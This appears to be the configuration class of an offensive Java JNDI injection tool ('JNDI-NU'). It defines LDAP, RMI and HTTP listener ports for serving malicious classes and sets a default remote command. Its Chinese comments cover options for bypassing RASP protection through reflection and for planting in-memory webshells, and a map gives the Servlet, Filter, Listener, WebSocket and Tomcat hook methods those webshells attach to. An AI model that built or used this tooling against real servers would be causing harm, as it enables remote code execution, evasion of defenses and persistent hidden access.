package com.nu1r.jndi.utils;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;
import com.nu1r.jndi.Starter;

import java.util.HashMap;

public class Config {
    public static String codeBase;

    @Parameter(names = {"-i", "--ip"}, description = "Local ip address ", required = true, order = 1)
    public static String ip = "0.0.0.0";

    @Parameter(names = {"-l", "--ldapPort"}, description = "Ldap bind port", order = 2)
    public static int ldapPort = 1389;

    @Parameter(names = {"-rl", "--rmiPort"}, description = "rmi bind port", order = 2)
    public static int rmiPort = 1099;

    @Parameter(names = {"-p", "--httpPort"}, description = "Http bind port", order = 3)
    public static int httpPort = 3456;

    @Parameter(names = {"-h", "--help"}, help = true, description = "Show this help")
    private static boolean help = false;

    @Parameter(names = {"-c", "--command"}, help = true, description = "RMI this command")
    public static String command = "whoami";

    public static String rhost;
    public static String rport;

    public static void applyCmdArgs(String[] args) {
        //process cmd args
        JCommander jc = JCommander.newBuilder()
                .addObject(new Config())
                .build();
        try {
            jc.parse(args);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage() + "\n");
            help = true;
        }

        //获取当前 Jar 的名称
        String jarPath = Starter.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        jc.setProgramName("java -jar JNDI-NU.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if (help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }

        // 特别注意：最后一个反斜杠不能少啊
        Config.codeBase = "http://" + Config.ip + ":" + Config.httpPort + "/";
    }

    // 恶意类是否继承 AbstractTranslet
    public static Boolean IS_INHERIT_ABSTRACT_TRANSLET = false;

    //是否使用反射绕过RASP
    public static Boolean IS_OBSCURE = false;

    // 各种方式的内存马映射的路径
    public static String URL_PATTERN = "/nu1r";

    //内存马的类型
    public static String Shell_Type = "bx";

    //是否使用windows下Agent写入
    public static Boolean winAgent = false;

    //是否使用Linux下Agent写入
    public static Boolean linAgent = false;

    // 不同类型内存马的父类/接口与其关键参数的映射
    public static HashMap<String, String> KEY_METHOD_MAP = new HashMap<>();

    public static void init() {
        // Servlet 型内存马，关键方法 service
        KEY_METHOD_MAP.put("javax.servlet.Servlet", "service");
        // Filter 型内存马，关键方法 doFilter
        KEY_METHOD_MAP.put("javax.servlet.Filter", "doFilter");
        // Listener 型内存马，通常使用 ServletRequestListener， 关键方法 requestInitializedHandle
        KEY_METHOD_MAP.put("javax.servlet.ServletRequestListener", "requestInitializedHandle");
        // Websocket 型内存马，关键方法 onMessage
        KEY_METHOD_MAP.put("javax.websocket.MessageHandler$Whole", "onMessage");
        // Tomcat Upgrade 型内存马，关键方法 accept
        KEY_METHOD_MAP.put("org.apache.coyote.UpgradeProtocol", "accept");
        // Tomcat Executor 型内存马，关键方法 execute
        KEY_METHOD_MAP.put("org.apache.tomcat.util.threads.ThreadPoolExecutor", "execute");
    }
}
